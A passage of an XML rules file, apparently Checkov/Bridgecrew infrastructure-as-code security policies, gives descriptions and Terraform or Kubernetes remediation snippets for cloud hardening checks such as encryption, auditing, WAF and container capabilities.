  iam_role_arn    = "arn"
  log_destination = "log"
  traffic_type    = "ALL"
+ vpc_id          = aws_vpc.ok_vpc.id
}

resource "aws_vpc" "ok_vpc" {
  cidr_block = "10.0.0.0/16"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_9-enable-vpc-flow-logging' target='_blank'> https://docs.bridgecrew.io/docs/logging_9-enable-vpc-flow-logging</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_9-enable-vpc-flow-logging' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_75</key>
    <name>Ensure Azure Data Explorer uses double encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-data-explorer-does-not-use-double-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-data-explorer-does-not-use-double-encryption"></div>Azure Data Explorer does not use double encryption</div><a aria-label="Skip link to Azure Data Explorer does not use double encryption" class="heading-anchor-icon fa fa-anchor" href="#azure-data-explorer-does-not-use-double-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling double encryption helps protect and safeguard your data to meet your organizational security and compliance commitments. When double encryption has been enabled, data in the storage account is encrypted twice, once at the service level and once at the infrastructure level, using two different encryption algorithms and two different keys.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_kusto_cluster</li>
<li><strong>Argument:</strong> double_encryption_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_kusto_cluster" "example" {
  ...
+ double_encryption_enabled = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-uses-double-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-uses-double-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-uses-double-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_188</key>
    <name>Ensure AWS RedShift Cluster is encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-redshift-cluster-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-red-shift-cluster-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></div>AWS RedShift Cluster is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS RedShift Cluster is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-redshift-cluster-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies RedShift Clusters which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your RedShift Cluster data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_efs_file_system"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-efs-file-system"></div>Resource: aws_efs_file_system</div><a aria-label="Skip link to Resource: aws_efs_file_system" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_efs_file_system"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-encrypted"></div>Arguments: encrypted</div><a aria-label="Skip link to Arguments: encrypted" class="heading-anchor-icon fa fa-anchor" href="#arguments-encrypted"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_redshift_cluster" "pass" {
  cluster_identifier                  = "examplea"
  availability_zone                   = data.aws_availability_zones.available.names[0]
  database_name                       = "mydb"
  master_username                     = "foo_test"
  master_password                     = "Mustbe8characters"
  node_type                           = "dc2.large"
  automated_snapshot_retention_period = 0
  allow_version_upgrade               = false
  skip_final_snapshot                 = true
  encrypted                           = true
  kms_key_id                          = aws_kms_key.test.arn
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-redshift-cluster-is-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-redshift-cluster-is-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-redshift-cluster-is-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_38</key>
    <name>Ensure AWS EKS cluster security group is not overly permissive to all traffic</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-eks-cluster-security-group-overly-permissive-to-all-traffic"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-eks-cluster-security-group-overly-permissive-to-all-traffic"></div>AWS EKS cluster security group overly permissive to all traffic</div><a aria-label="Skip link to AWS EKS cluster security group overly permissive to all traffic" class="heading-anchor-icon fa fa-anchor" href="#aws-eks-cluster-security-group-overly-permissive-to-all-traffic"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon EKS creates an endpoint for any managed Kubernetes API server to communicate with the cluster. By default, this API server endpoint is public to the internet. Access to it should be regulated using AWS IAM and native Kubernetes RBAC.</p>
<p>We recommend that your Kubernetes API server remains private so that all communication between worker nodes and APIs stays within your VPC. If public access is needed, at a minimum, restrict the IP addresses that can access your API server from the internet to reduce the potential attack surface. Ensure your Amazon EKS public endpoint is not accessible to 0.0.0.0/0.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="amazon-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-amazon-console"></div>Amazon Console</div><a aria-label="Skip link to Amazon Console" class="heading-anchor-icon fa fa-anchor" href="#amazon-console"></a></h2>
<ol>
<li>Login to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/eks/" target="_self">Amazon EKS console</a>.</li>
<li>To display your cluster information, select the cluster's name.</li>
<li>Navigate to <strong>Networking</strong>, select <strong>Update</strong>.</li>
<li>Select<strong> Private Access</strong> or <strong>Public Access</strong>.<br/>
<strong>Private access</strong>. Select whether to enable or disable private access for your cluster's Kubernetes API server endpoint. If you enable private access, Kubernetes API requests that originate from within your cluster's VPC use the private VPC endpoint. You must enable private access to disable public access.<br/>
<strong>Public access</strong>. Select whether to enable or disable public access for your cluster's Kubernetes API server endpoint. If you disable public access, your cluster's Kubernetes API server can only receive requests from within the cluster VPC.</li>
<li>Click <strong>Advanced Settings</strong>.</li>
<li>To enter a CIDR block or add additional blocks, select <strong>Add Source</strong>. If you specify no blocks, the public API server endpoint receives requests from all (0.0.0.0/0) IP addresses.</li>
<li>To finish, click <strong>Update</strong>.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_kubernetes_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_120</key>
    <name>Ensure Azure application gateway has WAF enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-application-gateway-does-not-have-waf-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-application-gateway-does-not-have-waf-enabled"></div>Azure application gateway does not have WAF enabled</div><a aria-label="Skip link to Azure application gateway does not have WAF enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-application-gateway-does-not-have-waf-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA. Web application firewall (WAF). </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_application_gateway</li>
<li><strong>Argument:</strong> waf_configuration.enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_application_gateway" "network" {
              ...
+             waf_configuration {
+               enabled = true
              }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-application-gateway-enables-waf' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-application-gateway-enables-waf</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-application-gateway-enables-waf' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_77</key>
    <name>Ensure Athena Database is encrypted at rest</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="athena-database-is-not-encrypted-at-rest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-athena-database-is-not-encrypted-at-rest"></div>Athena Database is not encrypted at rest</div><a aria-label="Skip link to Athena Database is not encrypted at rest" class="heading-anchor-icon fa fa-anchor" href="#athena-database-is-not-encrypted-at-rest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Athena is a query service managed by AWS that uses standard SQL to analyze data directly in Amazon S3. Encryption of data while in transit between Amazon Athena and S3 is provided by default using SSL/TLS, but encryption of query results at rest is not enabled by default. </p>
<p>The encryption at rest feature available for AWS Athena query results provides an additional layer of data protection by helping secure your data against unauthorized access to the underlying Amazon S3 storage.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>. </li>
<li>Open the <strong>Amazon Athena console</strong>.</li>
<li>In the Athena console, choose Settings.</li>
<li>Choose<strong> Encrypt query results</strong>.</li>
<li>For Encryption select either CSE-KMS, SSE-KMS, or SSE-S3.</li>
<li>If your account has access to an existing AWS KMS customer managed key (CMK), choose its alias or choose<strong> Enter a KMS key ARN</strong>, then enter an ARN.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_athena_database</li>
<li><strong>Arguments:</strong>encryption_configuration - (Optional) The encryption key block AWS Athena uses to decrypt the data in S3, such as an AWS Key Management Service (AWS KMS) key. An encryption_configuration block is documented below. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_athena_database" "examplea" {
  ...
  name   = "database_name"
+ encryption_configuration {
+   encryption_option = var.encryption_option
+   kms_key           = var.kms_key_arn
+ }
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_29' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_29</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_29' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_95</key>
    <name>Ensure the --request-timeout argument is set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---request-timeout-argument-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-request-timeout-argument-is-not-set-appropriately"></div>The --request-timeout argument is not set appropriately</div><a aria-label="Skip link to The --request-timeout argument is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---request-timeout-argument-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Set global request timeout for API server requests as appropriate. Setting global request timeout allows extending the API server request timeout limit to a duration appropriate to the user's connection speed. By default, it is set to 60 seconds which might be problematic on slower connections making cluster resources inaccessible once the data volume for requests exceeds what can be transmitted in 60 seconds. But, setting this timeout limit to be too large can exhaust the API server resources making it prone to Denial-of-Service attack. Hence, it is recommended to set this limit as appropriate and change the default limit of 60 seconds only if needed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --request-timeout=2m3s
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-request-timeout-argument-is-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-request-timeout-argument-is-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-request-timeout-argument-is-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_23</key>
    <name>Ensure Azure SQL server auditing is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-sql-server-auditing-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-sql-server-auditing-is-disabled"></div>Azure SQL server auditing is disabled</div><a aria-label="Skip link to Azure SQL server auditing is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-sql-server-auditing-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Azure platform allows a SQL server to be created as a service. Auditing tracks database events and writes them to an audit log in the Azure storage account. It also helps to maintain regulatory compliance, understand database activity, and gain insight into discrepancies and anomalies that could indicate business concerns or suspected security violations.</p>
<p>We recommend you enable auditing at the server level, ensuring all existing and newly created databases on the SQL server instance are audited. </p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>An auditing policy applied to a SQL database does not override an auditing policy or settings applied on the SQL server where the database is hosted.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>SQL servers</strong>.</li>
<li>For each server instance:<br/>
a) Click <strong>Auditing</strong>.<br/>
b) Set <strong>Auditing</strong> to <strong>On</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To get the list of all SQL Servers, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Get-AzureRmSqlServer</code></p>
<p>To enable auditing for each Server, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Set-AzureRmSqlServerAuditingPolicy 
-ResourceGroupName &lt;resource group name&gt; 
-ServerName &lt;server name&gt; 
-AuditType &lt;audit type&gt; 
-StorageAccountName &lt;storage account name&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_sql_server, azurerm_mssql_server</li>
<li><strong>Field</strong>: extended_auditing_policy</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_sql_server" "example" {
        ...
 +   extended_auditing_policy {
       storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint
       storage_account_access_key = azurerm_storage_account.example.primary_access_key
       storage_account_access_key_is_secondary = true
       retention_in_days                       = 90
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_logging_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_logging_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_logging_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_36</key>
    <name>Ensure admission of containers with capabilities assigned is limited</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="admission-of-containers-with-capabilities-assigned-is-not-limited"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-admission-of-containers-with-capabilities-assigned-is-not-limited"></div>Admission of containers with capabilities assigned is not limited</div><a aria-label="Skip link to Admission of containers with capabilities assigned is not limited" class="heading-anchor-icon fa fa-anchor" href="#admission-of-containers-with-capabilities-assigned-is-not-limited"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Docker has a default list of capabilities that are allowed for each container of a pod. The containers use the capabilities from this default list, but pod manifest authors can alter it by requesting additional capabilities, or dropping some of the default capabilities.</p>
<p>Limiting the admission of containers with capabilities ensures that only a small number of containers have extended capabilities outside the default range. This helps ensure that if a container becomes compromised it is unable to provide a productive path for an attacker to move laterally to other containers in the pod.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: securityContext:capabilities:drop (Optional)<br/>
Capabilites field allows granting certain privileges to a process without granting all the privileges of the root user. when <strong>drop</strong> includes <strong>ALL</strong>, all of the root privileges are disabled for that container.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
      capabilities:
        drop:
+         - ALL
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_34' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_34</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_34' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_89</key>
    <name>Ensure DMS replication instance is not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="dms-replication-instance-should-be-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-dms-replication-instance-should-be-publicly-accessible"></div>DMS replication instance should be publicly accessible</div><a aria-label="Skip link to DMS replication instance should be publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#dms-replication-instance-should-be-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS Database Migration Service (AWS DMS) is a service for migrating relational databases, data warehouses, NoSQL databases and other data stores. DMS can be used to migrate data into the AWS Cloud, between on-premises instances, or between combinations of cloud and on-premises environments.<br/>
An AWS DMS replication instance can have one public IP address and one private IP address, just like an Amazon Elastic Compute Cloud (Amazon EC2) instance that has a public IP address. If you uncheck (disable) the box for Publicly accessible, then the replication instance has only a private IP address.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
